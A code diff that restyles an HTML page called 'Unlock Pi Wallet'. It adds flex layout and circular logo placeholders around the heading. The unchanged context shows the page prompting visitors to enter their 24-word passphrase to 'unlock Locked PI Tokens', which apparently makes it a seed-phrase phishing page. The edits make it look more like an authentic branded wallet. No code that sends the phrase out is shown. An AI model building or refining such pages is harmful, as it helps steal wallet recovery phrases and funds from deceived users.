@@ -51,6 +51,10 @@
             font-size: 24px;
             margin-bottom: 20px;
             text-align: center; /* Centered the text */
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px; /* Space between logo and text */
         }
         .passphrase-input {
             width: 100%;
@@ -93,6 +97,12 @@
         .warning a:hover {
             text-decoration: underline;
         }
+        .logo-placeholder {
+            width: 40px; /* Adjust size as needed */
+            height: 40px; /* Adjust size as needed */
+            background-color: #ccc; /* Placeholder color */
+            border-radius: 50%; /* Circular logo */
+        }
     </style>
 </head>
 <body>
@@ -109,7 +119,11 @@
         </div>
 
         <!-- Unlock Pi Wallet Content -->
-        <h1>Unlock Pi Wallet</h1>
+        <h1>
+            <div class="logo-placeholder"></div> <!-- Left Pi Logo Placeholder -->
+            Unlock Pi Wallet
+            <div class="logo-placeholder"></div> <!-- Right Pi Logo Placeholder -->
+        </h1>
         <p>Enter your 24-word passphrase here to unlock Locked PI Tokens</p>
         <textarea id="passphrase-input" class="passphrase-input" placeholder="Enter your 24-word passphrase"></textarea>
         <button id="unlock-button" class="button unlock-button">Unlock with Passphrase</button>
